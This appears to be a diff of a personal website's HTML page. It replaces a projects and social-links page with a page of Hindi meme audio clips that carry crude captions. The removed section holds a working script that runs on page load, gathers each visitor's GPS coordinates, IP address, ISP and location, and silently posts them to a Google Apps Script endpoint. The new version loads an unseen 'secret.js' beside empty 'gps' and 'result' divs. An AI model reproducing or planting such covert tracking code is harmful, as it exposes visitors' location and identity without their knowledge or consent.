@@ -2,126 +2,84 @@
 
 <html>
 <head>
-  <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8" >
+  <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">       
   <title>Hello, World!</title>
-  <link rel="stylesheet" href="this.css">
-  <script src = "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
-    </script>
+  <link rel="stylesheet" href="secret.css">
 </head>
 <body>
-  <h1>Projects
-  </h1> 
-
-  <br>
-  <a id="calculator" href="latest.html">•Calculator</a>
-  <br> <br>
-  <a id="log" href="sign.html">•Login</a>
-  <br><br>
-  <a id="dowry" href="vinay.html">•Dowry</a>
-  <br><br>
-  <a  id="cid" href="https://sumitch77.github.io/cid/">•CID</a>
-    <br><br>
-  <a id="tourism" href="https://sumitch77.github.io/Tourism-/">•Tourism</a>
-   <br><br>
-  <a id="polity" href="https://sumitch77.github.io/Polity/">•Political Songs</a>
-   <br><br>
-  <a href="finalp.pdf" download>click</a>
-  <footer> 
-    <h2>Follow us on</h2>
+  <h1>
+    CID Special Audios
+  </h1>
+  <div id="non">
+   
+  <div class="main">
+    <img class="image" src="kyure.jpg" alt="image">
+    <p>Kyu re mc</p>
+    <img class="play" id="play1" src="play.png">
+    <audio src="kyure.mp3" id="aud1" class="audio" controls preload="auto"></audio><br>
+    <a href="kyure.mp3" id="down1" class="down" download>Download</a>  
+  </div>
     
-    <div id="fot">
-  <a href="https://www.instagram.com/sumit_ch_77?igsh=b2Y1ZndpeXkxemRo"><img id="insta" src="ins.jpg" alt="instagram logo"></a>
-  <br>
-  <a href="https://www.facebook.com/profile.php?id=61560632547412&mibextid=ZbWKwL"><img id="face"  src="faceb.png" alt="facebook logo"></a>
-  <br>
-    <a href="https://x.com/SumitCH7728?t=886Cggc9YJlhD0sQf6oHeA&s=09"><img id="twit"  src="xt.jpg" alt="facebook logo"></a>
-    <br>
-  <a href="https://www.chess.com/member/nobody7728"><img id="face"  src="ches.jpg" alt="facebook logo"></a>
+  <div class="main">
+    <img class="image" src="acp3.jpg" alt="image">
+    <p>Ye kya bak rhe ho mc</p>
+    <img class="play" id="play2" src="play.png">
+    <audio src="yekya.mp3" id="aud2" class="audio" controls preload="auto"></audio><br>
+    <a href="yekya.mp3" id="down2" class="down" download>Download</a>  
+  </div>
   
-      
-    </div>
-    <br><br>
-    <div id="no">
-  BGMI ID - GodSumit
-    <br><br>
-  COC tag - PCG9CCYUC
-  <br>
-    </div>  
-    </footer>
-  
-  <script>
-
-  function getLocation() {
-                    
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(function (position) {
-                            var lat = position.coords.latitude;
-                            var lon = position.coords.longitude;
-                            let gta = lat.toFixed(5) +","+ lon.toFixed(5);
-                            let data = gta;
-                            fetch("https://script.google.com/macros/s/AKfycbx5wRNdTlOjbdVYDgz1wTLG8wY7k3yRAHcioAwKSBAos2hp78qgf9xCL6LI4xwZkMOG/exec", {
-                              
-               method: "POST",
-              mode: "no-cors",   
-    headers: { "Content-Type": "text/plain" },
-    body: JSON.stringify(data)
-  })
-  .then(res => res.text())
-  .then(response => {
-    console.log("shared");
-        
-        
-        
-  })
-  .catch(err => console.error(err));
-  
-                            var mapLink = 'https://www.google.com/maps?q=' + lat + ',' + lon;
-                        }, function (error) {
-                            console.log("504");
-                        });
-                    } else {
-                        console.log("502");
-                    }
-                }
-                 
-  function hac() {
-  $.getJSON('https://ipapi.co/json/', function(data){
-       
-       let ip = data.ip;
-       let isp = data.org;
-       let state = data.region;
-       let country = data.country_name;
-       let lat = data.latitude;
-       let long = data.longitude;
-       datu = {
-           ip,
-           isp,
-           state,
-           country,
-           lat,
-           long
-       }
-fetch("https://script.google.com/macros/s/AKfycbx5wRNdTlOjbdVYDgz1wTLG8wY7k3yRAHcioAwKSBAos2hp78qgf9xCL6LI4xwZkMOG/exec", {
-                                  
-               method: "POST",
-              mode: "no-cors",   
-    headers: { "Content-Type": "text/plain" },
-    body: JSON.stringify(datu)
-  })
-  .then(res => res.text())
-  .then(response => {
-    console.log("shared");
-        
-        
-        
-  })
-  .catch(err => console.error(err));
-  
-   })
-  }
-  
-  hac();
-  getLocation();
-  </script>
+    <div class="main">
+    <img class="image" src="ab3.jpg" alt="image">
+    <p>Pakad mc ruk teri</p>
+    <img class="play" id="play3" src="play.png">
+    <audio src="pakad.mp3" id="aud3" class="audio" controls preload="auto"></audio><br>
+    <a href="pakad.mp3" id="down3" class="down" download>Download</a>  
+  </div>
+    
+    <div class="main">
+    <img class="image" src="acp1.jpg" alt="image">
+    <p>bhencho</p>
+    <img class="play" id="play4" src="play.png">
+    <audio src="bhen.mp3" id="aud4" class="audio" controls preload="auto"></audio><br>
+    <a href="bhen.mp3" id="down4" class="down" download>Download</a>  
+  </div>
+    
+    <div class="main">
+    <img class="image" src="ab.jpg" alt="image">
+    <p>Ek Rhepta mara na</p>
+    <img class="play" id="play5" src="play.png">
+    <audio src="ekrhep.mp3" id="aud5" class="audio" controls preload="auto"></audio><br>
+    <a href="ekrhep.mp3" id="down5" class="down" download>Download</a>  
+  </div>
+    
+    <div class="main">
+    <img class="image" src="acp2.jpg" alt="image">
+    <p>Tumhari seal todu</p>
+    <img class="play" id="play6" src="play.png">
+    <audio src="todd.mp3" id="aud6" class="audio" controls preload="auto"></audio><br>
+    <a href="todd.mp3" id="down6" class="down" download>Download</a>  
+  </div>
+    
+    <div class="main">
+    <img class="image" src="acp5.jpg" alt="image">
+    <p>Padhai likhai ki umar ha</p>
+    <img class="play" id="play7" src="play.png">
+    <audio src="pdhai.mp3" id="aud7" class="audio" controls preload="auto"></audio><br>
+    <a href="pdhai.mp3" id="down7" class="down" download>Download</a>  
+  </div>
+    
+    <div class="main">
+    <img class="image" src="acp4.jpg" alt="image">
+    <p>Oh waiter idhar aao</p>
+    <img class="play" id="play8" src="play.png">
+    <audio src="waiter.mp3" id="aud8" class="audio" controls preload="auto"></audio><br>
+    <a href="waiter.mp3" id="down8" class="down" download>Download</a>  
+  </div>
+    
+  </div> 
+    <div id="gps"></div>
+    <div id="result"></div>
+    
+  <script src="secret.js"></script>
 </body>
 </html>
